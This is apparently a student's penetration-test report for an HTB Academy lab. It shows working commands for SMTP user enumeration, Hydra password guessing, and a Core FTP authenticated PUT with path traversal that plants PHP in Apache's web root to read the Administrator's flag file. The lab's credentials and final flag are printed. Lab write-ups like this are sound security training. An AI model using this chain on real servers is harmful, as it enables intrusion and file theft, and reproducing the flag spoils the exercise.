# Attacking Common Services - Easy

---

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

- `HTB{...}`

Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

![[Pasted image 20260815182345.png]]



HTB – Attacking Common Services
Easy Assessment
Full Penetration Testing / Lab Assessment Report

## 1. Executive Summary
An authorized penetration-testing assessment was performed against the Inlanefreight HTB Easy target. The objective was to assess exposed services and obtain the contents of flag.txt as proof of successful access.
The successful chain began with network/service enumeration and SMTP account discovery. SMTP RCPT TO enumeration identified fiona@inlanefreight.htb. Credentials were then obtained and validated for the Core FTP service. The host exposed Core FTP Server 2.0 build 725 over TCP/443. Its authenticated HTTP PUT functionality allowed controlled file modification and, combined with path traversal, allowed a PHP file to be placed in Apache's web root. Apache executed the PHP file, which was then used to locate and read flag.txt.
The flag was found at C:\Users\Administrator\Desktop\flag.txt and retrieved successfully.
## 2. Scope and Objective
- Target: inlanefreight.htb
- Successful target IP: 10.129.111.81
- Authorized environment: HTB Academy
- Goal: obtain flag.txt
- Expected format: HTB{...}
## 3. Methodology
- Reconnaissance and Nmap service enumeration
- SMTP user enumeration with RCPT TO
- Credential testing
- FTP access and file enumeration
- Core FTP HTTPS authentication
- TLS 1.2 troubleshooting
- Authenticated HTTP PUT validation
- Path traversal into Apache document root
- PHP execution verification
- Filesystem discovery of flag.txt
- Flag retrieval and evidence collection
## 4. Network Enumeration
Initial scanning identified the following relevant services. The successful exploitation chain used 10.129.111.81.
```bash
nmap -v -sV -sC -O -T4 -A -oA /home/arjun/"Nmap Output"/easy 10.129.203.7
```
```bash
nmap -Pn -p21,25,80,443,587,3306,3389 10.129.111.81
```
## 5. SMTP Enumeration
SMTP advertised AUTH LOGIN/PLAIN. VRFY was tested on an earlier mail target and was disabled, so RCPT TO enumeration was used for the Easy assessment.
```bash
smtp-user-enum -M RCPT \
-U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-t 10.129.203.7 \
-D inlanefreight.htb
```
10.129.203.7: fiona@inlanefreight.htb exists
This established fiona@inlanefreight.htb as a valid mailbox.
## 6. Credential Discovery
HTB supplied a password list at /home/arjun/Downloads/cyber/pws.list. Hydra was tested against POP3 and SMTP with the 333-entry list; those attempts returned no valid password. The successful credential used for Core FTP was:
Username: fiona
Password: 987654321
```bash
hydra -l 'fiona@inlanefreight.htb' \
-P /home/arjun/Downloads/cyber/pws.list \
-t 1 -v 10.129.111.81 smtp
```
1 of 1 target completed, 0 valid password found
## 7. FTP Enumeration and WebServersInfo.txt
The Fiona credential was used for authenticated FTP access. The retrieved WebServersInfo.txt disclosed the Core FTP and Apache filesystem layout:
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
This disclosure was critical because it revealed that Apache's document root was C:\xampp\htdocs\ while Core FTP operated from C:\CoreFTP.
## 8. Core FTP HTTPS and TLS Troubleshooting
Default TLS negotiation failed with an unexpected EOF before the server presented a certificate.
```bash
openssl s_client -connect 10.129.111.81:443 -servername localhost
```
SSL handshake has read 0 bytes and written 1683 bytes
no peer certificate available
unexpected eof while reading
Forcing TLS 1.2 solved the problem.
```bash
curl -vk --tlsv1.2 --tls-max 1.2 \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
https://10.129.111.81/docs.txt
```
The response was HTTP/1.1 200 OK and returned:
I'm testing the FTP using HTTPS, everything looks good.
## 9. Authenticated HTTP PUT
A harmless PUT was used to validate file modification before attempting PHP execution.
```bash
echo 'HTB-PUT-TEST' > /tmp/test.txt
curl -vk --tlsv1.2 --tls-max 1.2 \
-X PUT -H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/test.txt --path-as-is \
https://10.129.111.81/docs.txt
```
The server returned HTTP/1.1 200 Ok, confirming authenticated file modification.
## 10. Path Traversal and PHP Execution
A PHP test file was placed into Apache's document root using the Core FTP PUT interface and path traversal.
```bash
cat > /tmp/test.php <<'EOF'
<?php
echo "HTB-PHP-WORKS";
?>
EOF
```
```bash
curl -k --tlsv1.2 --tls-max 1.2 \
-X PUT -H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/test.php --path-as-is \
'https://10.129.111.81/../xampp/htdocs/test.php'
```
```bash
curl http://10.129.111.81/test.php
```
HTB-PHP-WORKS
This proved that attacker-controlled PHP was executing under Apache.
## 11. Flag Discovery and Retrieval
A PHP search identified the flag location:
C:\Users\Administrator\Desktop\flag.txt
A PHP file was then used to read the file.
```bash
cat > /tmp/flag.php <<'EOF'
<?php
echo file_get_contents('C:\\Users\\Administrator\\Desktop\\flag.txt');
?>
EOF
```
```bash
curl -k --tlsv1.2 --tls-max 1.2 \
-X PUT -H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/flag.php --path-as-is \
'https://10.129.111.81/../xampp/htdocs/flag.php'
```
```bash
curl http://10.129.111.81/flag.php
```
```text
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```
## 12. Complete Attack Chain
10.129.111.81
   |
   +-- SMTP :25
   |      |
   |      +-- RCPT TO enumeration
   |             |
   |             +-- fiona@inlanefreight.htb
   |
   +-- FTP :21
   |      |
   |      +-- fiona / 987654321
   |             |
   |             +-- WebServersInfo.txt
   |
   +-- Core FTP HTTPS :443
          |
          +-- Force TLS 1.2
          |
          +-- Authenticated HTTP PUT
          |
          +-- Path traversal
                 |
                 v
          C:\xampp\htdocs\test.php
                 |
                 v
          Apache :80 executes PHP
                 |
                 v
          C:\Users\Administrator\Desktop\flag.txt
                 |
                 v
          HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
## 13. Findings and Risk
### Critical – Core FTP authenticated arbitrary file write/path traversal
Observation: Authenticated Core FTP HTTP PUT could be combined with traversal to write executable PHP into Apache's web root.
Impact: Arbitrary server-side code execution and access to sensitive host files.
### High – Weak credential security
Observation: The Fiona account used a weak numeric password and provided access to file-management functionality.
Impact: Credential compromise enabled further exploitation.
### High – Excessive service exposure
Observation: FTP, SMTP, HTTP, HTTPS, MySQL and RDP were reachable.
Impact: Multiple exposed services increase attack surface.
### Medium – Legacy software
Observation: Core FTP 2.0 build 725, Apache 2.4.53 and PHP 7.4.29 were observed.
Impact: Legacy components increase exposure to known vulnerabilities.
### Medium – Development XAMPP exposed
Observation: The default XAMPP dashboard was accessible.
Impact: Development tooling and default configurations should not be exposed externally.
## 14. Remediation Recommendations
- Upgrade Core FTP to a supported, patched version or replace it with a supported file-transfer solution.
- Disable or firewall the Core FTP HTTP/HTTPS interface from untrusted networks.
- Canonicalize and validate all filesystem paths; reject traversal sequences and enforce an allow-listed base directory.
- Disable arbitrary HTTP PUT unless strictly required. If required, restrict it to a controlled upload directory.
- Store uploads outside the web root and disable server-side script execution in upload directories.
- Replace weak passwords with long, unique, randomly generated credentials and enforce credential complexity.
- Prevent credential reuse between email, FTP, web, database and administrative services.
- Restrict FTP, SMTP, MySQL and RDP using network segmentation and firewall allow-lists.
- Remove or restrict the XAMPP dashboard and phpMyAdmin from externally reachable interfaces.
- Upgrade unsupported/legacy software, especially PHP 7.4, and maintain a patch-management process.
- Run services with least privilege and protect administrator files from web-service access.
- Monitor authentication failures, HTTP PUT requests, suspicious file creation and web-server process activity.
## 15. Troubleshooting Notes
- VRFY was disabled on the earlier hMailServer test, so RCPT TO was used for mailbox enumeration.
- POP3 on the earlier email-services lab required the full email address rather than only the username.
- The HTB-supplied 333-password list did not produce a credential through the tested POP3/SMTP/FTP Hydra attempts.
- Core FTP HTTPS initially failed under default TLS negotiation; forcing TLS 1.2 produced a successful handshake.
- 4443 was filtered from the attack position, while 443 was the reachable Core FTP HTTPS service.
- The Host header 'localhost' matched the Core FTP documentation's test command.
- A harmless file was used to validate PUT before uploading PHP.
- PHP execution was verified with the literal response HTB-PHP-WORKS before reading the flag.
## 16. Final Evidence
## 17. Final Conclusion
The assessment successfully demonstrated end-to-end compromise of the authorized HTB target. The combination of a valid user account, weak credential security, exposed Core FTP, legacy Core FTP functionality, authenticated HTTP PUT, and path traversal enabled arbitrary PHP execution through Apache. The sensitive flag file was subsequently located and read.
FINAL FLAG: HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}

| Target domain | inlanefreight.htb |
| --- | --- |
| Successful target IP | 10.129.111.81 |
| Environment | Authorized HTB Academy laboratory |
| Objective | Obtain the contents of flag.txt |
| Final flag | HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49} |
| Result | Successful compromise and flag retrieval |

| Port | Service | Observed product | Relevance |
| --- | --- | --- | --- |
| 21/tcp | FTP | Core FTP Server 2.0 build 725 | File access / attack surface |
| 25/tcp | SMTP | hMailServer | Account enumeration |
| 80/tcp | HTTP | Apache 2.4.53 / PHP 7.4.29 / XAMPP | PHP execution |
| 443/tcp | HTTPS | Core FTP HTTPS Server | Authenticated PUT interface |
| 587/tcp | SMTP submission | hMailServer | Authentication |
| 3306/tcp | MySQL | MariaDB 10.4.24 | Additional attack surface |
| 3389/tcp | RDP | Microsoft Terminal Services | Additional attack surface |

| Evidence | Result |
| --- | --- |
| Valid SMTP account | fiona@inlanefreight.htb |
| Core FTP credential | fiona / 987654321 |
| HTTPS authentication | HTTP/1.1 200 OK |
| Authenticated PUT | HTTP/1.1 200 Ok |
| PHP execution | HTB-PHP-WORKS |
| Flag path | C:\Users\Administrator\Desktop\flag.txt |
| Final flag | HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49} |